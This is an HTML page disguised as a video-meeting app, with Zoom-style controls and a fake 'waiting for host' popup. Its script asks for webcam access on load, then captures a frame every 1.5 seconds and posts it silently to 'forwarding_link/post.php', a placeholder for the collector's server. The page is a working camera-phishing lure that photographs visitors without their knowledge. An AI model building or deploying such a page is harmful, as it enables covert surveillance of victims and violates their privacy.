<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Video App</title>

    <!-- Fuente y Estilos -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <!-- Scripts que mencionaste -->
    <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Modern Video App</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&display=swap" rel="stylesheet" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Nunito', sans-serif;
        }
        
        body {
            background-color: #1e1e2f;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .video-wrap {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            background-color: #1e1e2f;
            padding: 20px;
        }
        
        video,
        canvas {
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
            max-width: 90%;
            height: auto;
        }
        
        .bottom-bar {
            background-color: #2a2c34;
            padding: 10px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid #3a3b45;
        }
        
        .controls {
            display: flex;
            gap: 30px;
        }
        
        .icon-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 14px;
            color: #ccc;
            cursor: pointer;
            transition: color 0.3s;
        }
        
        .icon-button i {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .icon-button:hover {
            color: #fff;
        }
        
        button.end-btn {
            background-color: #e74c3c;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        button.end-btn:hover {
            background-color: #c0392b;
        }
        
        .float_button {
            position: fixed;
            top: 15px;
            right: 15px;
            width: 40px;
            height: 40px;
            background-color: #3b3d49;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }
        
        .float_button i {
            color: white;
            font-size: 18px;
        }
        
        #ac-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        #popup {
            background: #fff;
            color: #333;
            padding: 20px 40px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
            max-width: 90%;
            text-align: center;
        }
        
        #popup h2 {
            font-size: 20px;
        }
        
        @media (max-width: 600px) {
            .controls {
                flex-wrap: wrap;
                gap: 15px;
            }
            .icon-button {
                font-size: 12px;
            }
            .icon-button i {
                font-size: 20px;
            }
            button.end-btn {
                padding: 8px 15px;
                font-size: 14px;
            }
        }
    </style>
</head>

<body>
    <div class="float_button" title="Expand">
        <i class="fas fa-expand"></i>
    </div>

    <div id="ac-wrapper">
        <div id="popup">
            <h2>Please wait, the meeting host will let you in soon</h2>
        </div>
    </div>

    <div class="video-wrap">
        <canvas id="canvas" width="640" height="480"></canvas>
        <video id="video" playsinline autoplay style="display: none;"></video>
    </div>

    <div class="bottom-bar">
        <div class="controls">
            <div class="icon-button"><i class="fas fa-microphone"></i><span>Mute</span></div>
            <div class="icon-button"><i class="fas fa-video"></i><span>Stop Video</span></div>
            <div class="icon-button"><i class="fas fa-shield-alt"></i><span>Security</span></div>
            <div class="icon-button"><i class="fas fa-users"></i><span>Participants</span></div>
            <div class="icon-button" style="color: lawngreen;"><i class="fas fa-share-square"></i><span>Share</span></div>
            <div class="icon-button"><i class="fas fa-comments"></i><span>Chat</span></div>
            <div class="icon-button"><i class="fas fa-record-vinyl"></i><span>Record</span></div>
        </div>
        <button class="end-btn">End</button>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                const context = canvas.getContext('2d');
                setInterval(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imgData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(imgData);
                }, 1500);
            } catch (e) {
                console.error("getUserMedia error:", e);
            }
        }

        function post(imgData) {
            fetch('forwarding_link/post.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `cat=${encodeURIComponent(imgData)}`
            });
        }

        function closePopup() {
            document.getElementById('ac-wrapper').style.display = "none";
        }

        window.onload = () => {
            init();
            setTimeout(closePopup, 5000); // Change to 50,000 if you want it after 50s
        };
    </script>
</body>

</html>
